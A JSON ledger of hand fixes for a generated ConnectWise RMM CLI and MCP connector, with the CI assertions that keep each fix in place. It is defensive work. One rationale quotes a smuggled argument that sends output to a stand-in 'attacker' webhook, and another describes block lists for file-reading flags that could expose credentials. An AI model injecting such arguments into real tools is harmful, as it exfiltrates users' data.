@@ -1,0 +1,570 @@
+{
+ "slug": "connectwise-rmm",
+ "doc": "docs/reprint-survival.md",
+ "_comment": "Connector-specific edits to GENERATED/authored files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one.",
+ "handfixes": [
+  {
+   "id": "asio-token-json-regional",
+   "summary": "The OAuth client-credentials mint posts a JSON body {grant_type, client_id, client_secret, scope} to the token URL of the client ID's region (0e30 NA, 0e31 EU, 0e32 AU), from the client auto-mint, `auth login` and `scopes` alike.",
+   "why": "The press mints with a form-encoded body plus HTTP Basic, and ConnectWise Asio rejects both: credential-less probes of https://openapi.service.itsupport247.net/v1/token on 2026-10-13 returned 400 'failed to decode request invalid JSON' for form encoding and for form + Basic, and the documented 404 'oauth app does not exist' only for a JSON body (receipt: cli-factory/connectwise-rmm/sources/token-probe-2026-10-13.txt). Asio also runs separate NA/EU/AU gateways and the client ID prefix names the region (ConnectWise University, 'Agent Last Seen API'), so an EU or AU tenant minting against the NA default would fail every request. Re-applied after a regen by ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (regen.sh -> apply_handfixes.py, polish_handfixes.py, doc_handfixes.py); a reprint that skips those scripts drops it while go build and go test stay green, and this entry is what notices.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/client/connectwise_rmm_token.go",
+     "contains": "func NewAsioTokenRequest(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "req, err := NewAsioTokenRequest(ctx, tokenURL, clientID, clientSecret, resolveClientCredentialsScope(), resolveClientCredentialsUserAgent())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "tokenURL := c.Config.AsioTokenURL()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "cfg.AsioTokenURLForClient(clientID)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cfg.applyAsioRegion()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/connectwise_rmm_config.go",
+     "contains": "\"0e31\": \"https://openapi.service.euplatform.connectwise.com\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectwise_rmm_token_test.go",
+     "contains": "func TestNewAsioTokenRequestSendsJSONCredentials(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/connectwise_rmm_config_test.go",
+     "contains": "func TestAsioRegionAndTokenURL(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "transport-standard",
+   "summary": "Generated with --transport standard, so the client uses a clone of net/http's default transport instead of the community-spec default HTTP/2 browser-impersonation transport (github.com/enetx/surf).",
+   "why": "The spec is a community-sourced Asio OpenAPI, and the press picks the browser-chrome transport for community specs. Asio is a plain partner REST gateway with no bot wall; the impersonation stack adds a large dependency tree (enetx/surf, utls, http3) to every binary and changes TLS fingerprints for no benefit. regen.sh passes --transport standard; a reprint without it would silently switch transports.",
+   "status": "active",
+   "spec_encode_followup": "regen.sh carries --transport standard on the generate command line; there is no spec extension for it yet.",
+   "asserts": [
+    {
+     "file": "cli/go.mod",
+     "not_contains": "github.com/enetx/surf"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "http.DefaultTransport.(*http.Transport).Clone()",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "tickets-paging-together",
+   "summary": "`tickets list` never sends pageSize or pageNum alone: --page-size by itself is paired with pageNum=1, --page-num by itself is refused before any request, and sync stores the unpaged response instead of the press's auto-pagination. The MCP execute tool (code_orch.go) applies the same pairing to tickets.list.",
+   "why": "The Asio ticket list documents that pageSize must be sent with pageNum and that either one alone is ignored or returns an empty page with a total count of 0 even when records exist. The press's generic paginator sent one paging key at a time, which on Asio reads as 'no tickets'. Encoded in the spec as x-pp-pagination: none on GET /api/platform/v1/service/ticketing/tickets, so a reprint from the same spec keeps it; the asserts catch a reprint from a spec that lost the extension. Acceptance (cli-factory/connectwise-rmm/acceptance/accept.sh) proves page 2 returns and that no request ever carries a lone paging key. Codex review (2026-10-13) caught that the generated flag retention still forwarded a lone --page-size; RunE now pairs or refuses, and tickets_paging_test.go drives both cases against a stub server. Codex round 2 caught the twin: connectwise-rmm_execute on tickets.list forwarded a lone pageSize; TestCodeOrchTicketsListPairsPagingKeys pins it.",
+   "status": "active",
+   "spec_encode_followup": "Already encoded in spec.yaml (x-pp-pagination: none); keep the extension on any spec refresh.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/tickets_list.go",
+     "contains": "page by passing --page-size and --page-num together"
+    },
+    {
+     "file": "cli/internal/cli/tickets_list.go",
+     "contains": "\"\", \"none\"), nil, flagAll, \"\", \"none\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/tickets_list.go",
+     "contains": "_ = fs.Set(\"page-num\", \"1\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/handfixes_test.go",
+     "contains": "func TestTicketsListNeverSendsALonePagingKey(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "if ep.ID == \"tickets.list\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch_delete_body_test.go",
+     "contains": "func TestCodeOrchTicketsListPairsPagingKeys(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-recipe-argv-not-flag-like",
+   "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element, and the reachable appendRecipePositional call site (why_did_the_script_fail's task_id) first runs rejectFlagLikeRecipeValue, which refuses a value beginning with '-' (except the bare '-') before the CLI runs. Also: the press's recipe lifter read the hyphenated subcommands 'reboot-due' and 'task-failures' as a positional 'slug' parameter; both handlers now run a static subcommand.",
+   "why": "Press 4.33.5 still emits the fleet-wide recipe argv gap (see skills/acronis/handfixes.json, mcp-recipe-argv-not-flag-like): a recipe positional is appended ahead of the recipe's own flags, so {\"task_id\": \"--deliver=webhook:https://attacker/\"} would be parsed by pflag as the denylisted root flag. The lifter defect made the reboot_queue tool demand a meaningless required 'slug' argument and splice it into argv as a subcommand. recipe_intents_test.go pins both: the corrected argv and the refusal of flag-shaped task_id values. Re-applied after a regen by ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (regen.sh -> apply_handfixes.py, polish_handfixes.py, doc_handfixes.py); a reprint that skips those scripts drops it while go build and go test stay green, and this entry is what notices.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "return append(args, \"--\"+name+\"=\"+selected), false",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "not_contains": "\"--\"+name, selected"
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "if err := rejectFlagLikeRecipeValue(\"task_id\", input[\"task_id\"]); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "args := []string{\"fleet\", \"reboot-due\", \"--agent\"}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "args := []string{\"fleet\", \"task-failures\"}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/recipe_intents_test.go",
+     "contains": "func TestRecipeIntentHandlerRejectsMissingAndFlagShapedTaskID(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "runtime-base-url-not-persisted",
+   "summary": "Saving config (after a token mint or auth login) writes the base_url and token_url the config FILE had, never a runtime value from CONNECTWISE_RMM_BASE_URL, CONNECTWISE_RMM_TOKEN_URL or region inference.",
+   "why": "Every mint calls SaveTokens, which rewrites config.toml. Without this, one run with CONNECTWISE_RMM_BASE_URL pointed at a test host, or one run where the client ID's prefix inferred the EU or AU host, was written into the file and silently pinned every later run, including runs for a different client ID. Re-applied after a regen by ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (regen.sh -> apply_handfixes.py, polish_handfixes.py, doc_handfixes.py); a reprint that skips those scripts drops it while go build and go test stay green, and this entry is what notices.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "out.BaseURL = c.fileConfig.BaseURL",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "out.TokenURL = c.fileConfig.TokenURL",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-verdict-tracks-reality",
+   "summary": "doctor treats a configured client ID and secret as configured auth, and verifies the credential with an authenticated GET /v1/rate_limits (needs a token, no scope) instead of printing 'present, not verified'; a 404 there turns the api row red, and a failed token mint is reported as a rejected credential with the scopes remedy.",
+   "why": "Measured by tools/maintainer/check_doctor_truth.py (issue #282). The 4.33.5 doctor failed that gate on this connector: 'present, not verified' in the healthy state, an HTML 200 at / read as a healthy API in the wrong-base state, and an identical credentials verdict whether the credential worked or not. On a real install it was worse: with CONNECTWISE_RMM_CLIENT_ID and CONNECTWISE_RMM_CLIENT_SECRET set on a fresh machine it printed 'FAIL Auth: not configured' plus a hint to export the variables the operator had already exported, because the pair only becomes a bearer token after the first mint. Verified against the factory mock: valid secret -> 'valid (verified with GET /v1/rate_limits)'; wrong secret -> 'ERROR rejected: the token request failed'; key lacking a default scope -> rejected with the `scopes` remedy; no credential -> explicit ERROR row.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorProbeCredentials(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorProbePath = \"/v1/rate_limits\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cfg, reachErr, report)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "if cfg != nil && doctorClientCredentialsConfigured(cfg) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "present, not verified. Run `%s %s`"
+    }
+   ]
+  },
+  {
+   "id": "install-credentials-declared-on-every-channel",
+   "summary": "Every operator-facing variable this connector reads is declared on all three install channels (manifest.json for the .mcpb, server.json for the MCP Registry, mcp-install.md for manual installs), with matching required/secret flags; the manifest name and entry point are the stripped connectwise-rmm-mcp.",
+   "why": "Issue #282: a variable the binary reads but the manifest never declares is one Claude Desktop never prompts for. The press manifest declared only CLIENT_ID and CLIENT_SECRET, so the region override, the scope list (needed whenever the key lacks one default scope, since Asio then rejects the whole token request), the MCP read-only kill switch and the HTTP transport token were unreachable from a bundle install, and server.json marked all of them required and secret. manifest.json, server.json and mcp-install.md are regenerated by /msp-skills-publish on every re-onboard (server.json keeps a hand-curated env list), so without this ledger a regeneration silently drops declarations while check_env_schema.py is the only other line of defence. The source manifest in ~/printing-press/library/connectwise-rmm carries the declarations so a resume re-derives mcp-install.md from them. PRINTING_PRESS_CLIENT_PROFILE stays declared because check_env_schema.py fails a variable the binary reads (internal/platform/profile.go) but no channel declares; its title and description say it is unused, because this connector registers no platform source (registerPlatformSource has no caller), so BindMCPServerProfile returns immediately and the value binds nothing. The press text promised tenant binding (Codex review 2026-10-13, P1). Its twins carry the same truth: the root --client-profile help says it is unused, and \"client-profile\" is in blockedRootFlags so the 32 MCP tool schemas no longer offer an inert tenant selector (fresh adversarial review 2026-10-13, P2).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTWISE_RMM_CLIENT_ID\": \"${user_config.connectwise_rmm_client_id}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTWISE_RMM_CLIENT_ID\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTWISE_RMM_CLIENT_ID\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTWISE_RMM_CLIENT_SECRET\": \"${user_config.connectwise_rmm_client_secret}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTWISE_RMM_CLIENT_SECRET\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTWISE_RMM_CLIENT_SECRET\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTWISE_RMM_OAUTH_SCOPE\": \"${user_config.connectwise_rmm_oauth_scope}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTWISE_RMM_OAUTH_SCOPE\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTWISE_RMM_OAUTH_SCOPE\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTWISE_RMM_BASE_URL\": \"${user_config.connectwise_rmm_base_url}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTWISE_RMM_BASE_URL\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTWISE_RMM_BASE_URL\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTWISE_RMM_TOKEN_URL\": \"${user_config.connectwise_rmm_token_url}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTWISE_RMM_TOKEN_URL\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTWISE_RMM_TOKEN_URL\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTWISE_RMM_USER_AGENT\": \"${user_config.connectwise_rmm_user_agent}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTWISE_RMM_USER_AGENT\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTWISE_RMM_USER_AGENT\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTWISE_RMM_MCP_READ_ONLY\": \"${user_config.connectwise_rmm_mcp_read_only}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTWISE_RMM_MCP_READ_ONLY\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTWISE_RMM_MCP_READ_ONLY\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTWISE_RMM_MCP_HTTP_TOKEN\": \"${user_config.connectwise_rmm_mcp_http_token}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTWISE_RMM_MCP_HTTP_TOKEN\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTWISE_RMM_MCP_HTTP_TOKEN\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"PRINTING_PRESS_CLIENT_PROFILE\": \"${user_config.printing_press_client_profile}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"PRINTING_PRESS_CLIENT_PROFILE\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"PRINTING_PRESS_CLIENT_PROFILE\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"name\": \"connectwise-rmm-mcp\""
+    },
+    {
+     "file": "manifest.json",
+     "not_contains": "-pp-mcp"
+    },
+    {
+     "file": "manifest.json",
+     "contains": "This connector registers no tenant-gated profile source"
+    },
+    {
+     "file": "server.json",
+     "contains": "This connector registers no tenant-gated profile source"
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"client-profile\":          true,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "Unused by this connector: no tenant-gated profile source is registered"
+    }
+   ]
+  },
+  {
+   "id": "store-scope-pinned-to-client-id",
+   "summary": "The local SQLite store is named from the API client ID and API host (config.StoreScopeIdentity), not from a hash of every credential field that happens to be loaded.",
+   "why": "Found by the fresh-context adversarial review on 2026-10-13. The generated store key hashed every loaded credential field, and the first token mint caches client_id/client_secret beside the env copies. On a fresh install the first `sync` therefore wrote data-<hashA>.db and every later command read data-<hashB>.db: guide.md's own Quick Start (doctor --dry-run, scopes, sync) ended with every fleet roll-up returning scanned_endpoints: 0, the MCP sync tool did the same, and dropping the env vars after caching moved to a third file. The factory acceptance suite passed --db explicitly and never saw it. TestAsioStoreScopeStableAcrossMint pins env-only, minted, cached-only and rotated-secret configs to one key and two clients to two keys (it fails with the init hook removed). Lives in the hand-owned internal/config/connectwise_rmm_config.go, which regen.sh copies forward, but the generated config.go must keep the StoreScopeIdentity hook.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/config/connectwise_rmm_config.go",
+     "contains": "func init() { StoreScopeIdentity = asioStoreScopeIdentity }",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "var StoreScopeIdentity func(*Config) string",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/connectwise_rmm_config_test.go",
+     "contains": "func TestAsioStoreScopeStableAcrossMint(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-surface-truth",
+   "summary": "Re-vendored docs carry corrections the press text gets wrong for this connector: SKILL.md description and H1, the Agent Mode list of immediate writes, guide.md's .mcpb platform text, mcp-install.md's product name and HTTP-transport wording, and AGENTS.md's TODO-free data-source paragraph.",
+   "why": "/msp-skills-publish re-copies SKILL.md, guide.md, AGENTS.md and mcp-install.md from the source on every --resume, so these edits are lost on a re-onboard while every build gate stays green. Each was a fresh-context adversarial finding or a gate failure: the bare 'ConnectWise MCP' name conflated this connector with the Automate, Control and Manage skills; guide.md promised five per-platform bundles when one bundle ships (tools/maintainer/mcpb_bundle.py); mcp-install.md said the HTTP root returns 404 (it answers initialize like /mcp) and cited an engine version; the Agent Mode list omitted ticket-notes create, endpoints create-agent-install-token and import, which also send immediately; AGENTS.md's 'TODO stubs' wording fails check_no_todos.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "SKILL.md",
+     "contains": "# ConnectWise RMM Claude Code Skill"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "description: \"Use when the user asks to find offline or silent ConnectWise RMM (Asio) agents"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "endpoints uninstall, endpoints create-agent-install-token, import) run immediately"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "Pre-built bundles ship for macOS Apple Silicon"
+    },
+    {
+     "file": "guide.md",
+     "contains": "One bundle covers every supported platform."
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "# ConnectWise RMM MCP - install for every agent that speaks MCP"
+    },
+    {
+     "file": "mcp-install.md",
+     "not_contains": "returns 404 at the"
+    },
+    {
+     "file": "AGENTS.md",
+     "not_contains": "TODO stubs"
+    },
+    {
+     "file": "AGENTS.md",
+     "contains": "endpoints uninstall, endpoints create-agent-install-token, import) run immediately"
+    },
+    {
+     "file": "guide.md",
+     "contains": "endpoints uninstall, endpoints create-agent-install-token, import) run immediately"
+    }
+   ]
+  },
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "summary": "The MCP shell-out layer refuses local-file READ flags (--input, --notes-file, --playbook-file, --playbook-notes-file, and --home should a command ever declare its own) on top of the write-sink names press 4.33.5 already blocks, a tree test fails the build when any shell-out tool still forwards a flag whose usage text names a filesystem path, and `import` (which requires --input) is hidden from MCP instead of being offered as a tool that always fails.",
+   "why": "Codex review (2026-10-13, P1): teach-playbook --notes-file and teach --playbook-file / --playbook-notes-file read any file the server account can reach (credentials.toml included) into the local store, where playbook_list and sql hand it back, even with CONNECTWISE_RMM_MCP_READ_ONLY=1 since teach is a local-write command; import --input is the same read primitive. Fleet precedent: skills/zammad, huntress, hubspot, datto-bcdr, wordpress (same id). The names are unioned into blockedDestinationFlags, which blockedStructuredArgsForCommand feeds to both the tool schema and cliArgsFromMCP, so the flags vanish from tools/list and are refused at call time. \"home\" is defensive: the only --home today is the root flag (already in blockedRootFlags), but a command-local --home would bypass the root-flag block. The usage-text rule (isFilesystemPathFlag) is deliberately not a name rule: generated API body fields named like paths go to the vendor, not this disk. Proven both ways: removing the five read names (leaving blockedRootFlags intact) makes TestNoShellOutToolCanDirectAFilesystemPath fail listing import --input, teach --playbook-file/--playbook-notes-file and teach-playbook --notes-file/--playbook-file; restored, it passes, and over stdio tools/list offers none of them and tools/call teach_playbook {notes-file} returns 'unknown MCP parameter' without spawning the CLI. With --input blocked the MCP import tool could never succeed (both Codex round 2 and the fresh adversarial review flagged it), so import carries mcp:hidden: it is CLI-only, which also keeps install-token minting and task scheduling from records out of an agent's reach. Not yet scripted in ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (the library source ~/printing-press/library/connectwise-rmm carries it); a regen that skips it drops it while go build stays green, and these asserts are what notice.",
+   "status": "active",
+   "spec_encode_followup": "Press-side: the read-source names and the usage-text rule belong in the generator's blockedDestinationFlags; a press that emits them natively retires this entry.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"notes-file\":          true,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"playbook-file\":       true,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"home\":                true,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
+     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/import.go",
+     "contains": "Annotations: map[string]string{\"mcp:hidden\": \"true\"},",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "code-orch-delete-body",
+   "summary": "The MCP execute tool (code orchestration) sends a DELETE's non-path params as a JSON body, so endpoints.uninstall carries endpoints, feedback and reason exactly as the CLI's `endpoints uninstall` does.",
+   "why": "Codex review (2026-10-13, P1): the generated executor routed every DELETE param to the query string and sent no body, while Asio's only DELETE (/api/platform/v1/device/endpoints/uninstall) reads its request from the body, so offboarding through connectwise-rmm_execute could never succeed. No per-endpoint MCP tool exists for uninstall, so execute is the only MCP path. code_orch_delete_body_test.go drives execute against a stub and fails on the generated routing (params leaked to the query string). Not yet scripted in ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (the library source ~/printing-press/library/connectwise-rmm carries it); a regen that skips it drops it while go build stays green, and these asserts are what notice.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "data, _, err = c.DeleteWithBody(ctx, path, body)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "not_contains": "data, _, err = c.DeleteWithParams(ctx, path, query)"
+    },
+    {
+     "file": "cli/internal/mcp/code_orch_delete_body_test.go",
+     "contains": "func TestCodeOrchExecuteSendsUninstallBody(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dry-run-never-mints",
+   "summary": "--dry-run previews with cached credentials only: neither an API command nor `auth login --dry-run` POSTs the client ID and secret to the token URL or writes credentials.toml.",
+   "why": "Codex review (2026-10-13, P2), reproduced: authHeader ran before the dry-run branch and minted a token when none was cached, so a preview sent the client secret to the live Asio token endpoint and persisted it, while the generated comment and the docs say a dry run sends no request. TestDryRunNeverMintsAToken counts requests to a stub token server and fails on the generated order. Not yet scripted in ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (the library source ~/printing-press/library/connectwise-rmm carries it); a regen that skips it drops it while go build stays green, and these asserts are what notice. Codex round 2 caught the twin: auth login mints through its own path (mintClientCredentialsToken), which ignored flags.dryRun; TestAuthLoginDryRunSendsNothing pins it.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if !c.DryRun && c.needsClientCredentialsMint() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectwise_rmm_token_test.go",
+     "contains": "func TestDryRunNeverMintsAToken(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "(dry run - no request sent, nothing saved)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/handfixes_test.go",
+     "contains": "func TestAuthLoginDryRunSendsNothing(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-bool-false-forwarded",
+   "summary": "The MCP shell-out layer forwards an explicit boolean false as --name=false instead of dropping it, so a default-true flag can be turned off from a tool call.",
+   "why": "Codex round 2 (2026-10-13, P2): cliArgsFromMCP emitted only true booleans, so MCP `tail` with {\"follow\": false} kept the default --follow=true and polled until the call timed out instead of returning one poll. pflag accepts --flag=false for every bool flag, and blocked flags are filtered before this point, so forwarding the caller's explicit value is the faithful translation. bool_false_test.go fails on the generated code (argv carried only --json). Not yet scripted in ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (the library source carries it); a regen that skips it drops it while go build stays green.",
+   "status": "active",
+   "spec_encode_followup": "Press-side: cliArgsFromMCP should forward explicit false; fleet-wide generator behaviour.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=false\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/bool_false_test.go",
+     "contains": "func TestExplicitFalseReachesTheCLI(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "happy-args-low-entropy-placeholders",
+   "summary": "endpoints list-company and list-site carry low-entropy placeholder UUIDs in their pp:happy-args annotation instead of the vendor-docs sample UUID",
+   "why": "The press copies the spec's path-parameter example into pp:happy-args as clientID=<uuid>. The vendor-docs sample UUID (436f6d6d-...) is high-entropy and sits right after the word client, so gitleaks generic-api-key flags both files and the guards job fails. The value is example data, not a credential; the fix is an obviously fake placeholder, never an allowlist. A reprint from the unchanged spec regenerates the sample UUID.",
+   "status": "active",
+   "spec_encode_followup": "Change the example: values for clientID/siteID on /api/platform/v1/device/clients/{clientID}/endpoints and .../sites/{siteID}/endpoints in cli-factory/connectwise-rmm/spec.yaml to 00000000-0000-0000-0000-000000000001 / ...0002 so a reprint emits these placeholders by construction.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/endpoints_list-company.go",
+     "contains": "\"pp:happy-args\": \"clientID=00000000-0000-0000-0000-000000000001\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/endpoints_list-site.go",
+     "contains": "\"pp:happy-args\": \"clientID=00000000-0000-0000-0000-000000000001;siteID=00000000-0000-0000-0000-000000000002\"",
+     "code_only": true
+    }
+   ]
+  }
+ ]
+}
